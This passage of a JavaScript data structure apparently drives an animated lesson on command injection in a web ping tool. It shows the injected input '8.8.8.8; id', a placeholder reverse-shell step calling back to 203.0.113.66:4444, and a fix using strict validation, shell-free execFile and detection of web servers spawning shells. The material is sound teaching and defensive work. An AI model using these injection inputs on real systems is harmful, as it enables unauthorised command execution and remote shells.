      fields: [['Input', '8.8.8.8; id'], ['Output', 'uid=33(www-data)']],
      packets: [
        ['atk', 'web', 'HTTP', 'POST /tools/ping host=8.8.8.8;id', 466, 'atk'],
        ['web', 'sh', 'exec', "sh -c 'ping -c 1 8.8.8.8; id'", 0, 'atk'],
        ['sh', 'web', 'stdout', 'uid=33(www-data) gid=33(www-data)', 320, 'data'],
        ['web', 'atk', 'HTTP', '200 OK (ping output + id output)', 960, 'data'],
      ],
    },
    {
      title: 'Getting a shell', sub: 'The server calls back',
      text: 'Instead of one command at a time, the attacker injects a reverse-shell one-liner. The server opens an outbound connection to the attacker, giving them an interactive shell.',
      fields: [['Direction', 'Outbound (bypasses inbound FW)'], ['Port', '4444/tcp']],
      packets: [
        ['atk', 'web', 'HTTP', 'POST /tools/ping host=8.8.8.8; <reverse-shell one-liner>', 540, 'atk'],
        ['web', 'sh', 'exec', 'shell spawns network connection', 0, 'atk'],
        ['sh', 'atk', 'TCP', '→ 203.0.113.66:4444 interactive shell session', 74, 'atk'],
      ],
    },
    {
      title: 'Fix: no shell, strict input', sub: 'Arguments, not strings',
      text: 'The app now validates `host` as an IP or hostname and calls `execFile("ping", ["-c", "1", host])` with no shell, so `;` has no special meaning. Egress filtering would also have stopped the callback.',
      fields: [['Validation', '^[a-zA-Z0-9.-]{1,253}$'], ['Call', 'execFile (no shell)']],
      defend: 'Watch for web server processes spawning shells (e.g. nginx → sh). It is a high-fidelity EDR detection.',
      packets: [
        ['atk', 'web', 'HTTP', 'POST /tools/ping host=8.8.8.8;id', 466, 'atk'],
        ['web', 'atk', 'HTTP', '400 Bad Request — invalid host', 160, 'def'],
      ],
    },
  ],
});
